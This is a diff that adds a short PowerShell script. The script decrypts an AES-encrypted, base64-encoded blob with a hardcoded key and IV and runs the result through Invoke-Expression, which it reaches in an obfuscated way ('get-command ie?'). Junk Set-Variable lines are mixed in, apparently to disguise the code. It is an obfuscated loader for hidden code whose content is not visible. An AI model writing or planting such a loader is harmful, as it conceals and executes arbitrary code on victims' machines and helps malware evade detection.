@@ -1,0 +1,17 @@
+$cipher = "GhKt8FYdSRPmB37YTqDtZ8fXq6W23UhqVfoAEPjb89rjhvICVL667Jy9ecxaOpn3jnvZLLeFxNCrAV84qCrJ5Gue5gxOGleloQKhwzpsp1lrqzxg0WeQcpUhCRUmi5QKLktFrwnvUDUm+eglMAExO6BQHRiIm79rtMBuPGUWO25vP9QTo1eyl/KCbcsacltWtNl+/2pPDntaKl24HR/wEA=="
+$key = "zGCgcrsDjxnp0CHiuWlIXY72zuuK6ekdkTs29VghRkY="
+$iv  = "4HgQekP9+dyVDsQGRITu9w=="
+$aes = [System.Security.Cryptography.Aes]::Create()
+sv cut Object
+$aes.Key = [Convert]::FromBase64String($key)
+sv $ Script
+$aes.IV = [Convert]::FromBase64String($iv)
+sv print New
+$aes.Mode = "CBC"
+$aes.Padding = "PKCS7"
+sv ListDirectory Run
+$bytes = [Convert]::FromBase64String($cipher)
+$decryptor = $aes.CreateDecryptor()
+sv ^ Shell
+$decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+.(get-command ie?).Name ([System.Text.Encoding]::UTF8.GetString($decrypted))
